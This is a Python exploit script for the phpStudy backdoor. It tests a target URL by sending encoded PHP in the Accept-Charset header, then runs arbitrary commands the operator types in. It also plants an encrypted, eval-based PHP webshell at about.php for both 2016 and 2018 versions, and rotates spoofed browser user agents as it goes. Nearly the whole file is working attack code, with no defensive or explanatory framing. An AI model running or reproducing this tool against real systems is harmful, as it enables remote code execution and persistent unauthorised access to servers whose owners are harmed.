'''
@Description: 
@Author: demos
@Github: https://github.com/demossl
'''

import requests
import base64
import random
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
]
TIME_OUT=15

class phpstudy_backdoor_getshell(object):
    def __init__(self,url,command):
        self._url = url
        self._command = command
    
    #访问器 - getter()方法
    @property
    def url(self):
        return self._url
    
    @property
    def command(self):
        return self._command
    
    #修改器 - setter()方法
    @url.setter
    def url(self,url):
        self._url = url
    
    @command.setter
    def command(self,command):
        self._command = command

    def check_Target(self):
        poc = {
            "Accept-Charset": "cGhwaW5mbygpOw==",
            "Accept-Encoding": "gzip,deflate"
        }
        try:
            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)
            if "phpinfo" in str(PocRequest.content):
                print('[+] Target is vulnerable.')
                return True
            else:
                print('[-] Target is NOT vulnerable.')
                return False
        except:
            print('[-] Looks Like Something Wrong.')
    
    def exploit(self):
        headers = {}
        headers['User-Agent'] = random.choice(USER_AGENTS)
        headers['Accept-Encoding'] = 'gzip,deflate'
        headers['Accept-Charset'] = self._command
        try:
            response = requests.get(self._url,headers=headers)
            response.encoding = 'gbk'
            if response.status_code == 200:
                print('[+] Command Execute Successful.')
                print(response.text)
            else:
                 print('[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.')
        except:
            print('[-] Looks Like Something Wrong.\n')
        
    def upload_shell_2018(self):
        headers = {}
        headers['User-Agent'] = random.choice(USER_AGENTS)
        headers['Accept-Encoding'] = 'gzip,deflate'
        headers['Accept-Charset'] = 'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='

        try:
            response = requests.get(self._url,headers=headers)
            response.encoding = 'gbk'
            if response.status_code == 200:
                print('[+] Upload Successful.')
                print('[+] The webshell is {}//{}/about.php'.format(self._url.split('/')[0],self._url.split('/')[2]))
            else:
                 print('[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.')
        except:
            print('[-] Looks Like Something Wrong.\n')
    
    def upload_shell_2016(self):
        headers = {}
        headers['User-Agent'] = random.choice(USER_AGENTS)
        headers['Accept-Encoding'] = 'gzip,deflate'
        headers['Accept-Charset'] = 'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='
        try:
            response = requests.get(self._url,headers=headers)
            response.encoding = 'gbk'
            if response.status_code == 200:
                print('[+] Upload Successful.')
                print('[+] The webshell is {}//{}/about.php'.format(self._url.split('/')[0],self._url.split('/')[2]))
            else:
                 print('[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.')
        except:
            print('[-] Looks Like Something Wrong.\n')
    

def main():
    x = phpstudy_backdoor_getshell('','')
    try:
        while True:
            url = input("Target url:\n")
            if ('http://' or 'https://') not in url:
                print('[-] Please input target url with http or https')
            else:
                print('[-] Checking Target...')
                x.url = url
                if x.check_Target():
                    cmd = input("Input Your Command:\n")
                    command = base64.b64encode(cmd.encode('utf-8'))
                    x.command = command
                    x.exploit()
                    print('[-] upload a Behinder webshell')
                    target = input('Please choose the version for phpstudy [2018/2016]\n')
                    if target == '2018':
                        x.upload_shell_2018()
                    elif target == '2016':
                        x.upload_shell_2016()
                else:
                    print('[-] some error!')
    except KeyboardInterrupt:
        sys.exit()

if __name__ == '__main__':
    main()